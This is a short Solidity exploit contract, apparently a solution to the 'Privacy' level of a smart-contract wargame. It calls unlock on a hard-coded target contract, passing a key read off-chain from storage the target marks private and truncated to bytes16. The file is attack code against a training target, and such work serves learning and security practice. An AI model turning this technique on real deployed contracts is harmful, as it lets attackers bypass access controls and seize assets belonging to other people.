// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Privacy {
    function unlock(bytes16 _key) external;
}

contract AttackPrivacy {
    Privacy public p = Privacy(0x6E2668537186b08471d3a2c617F354251f83e9Fe);

    function attack(bytes32 key) public  {
        p.unlock(bytes16(key));
    }
}
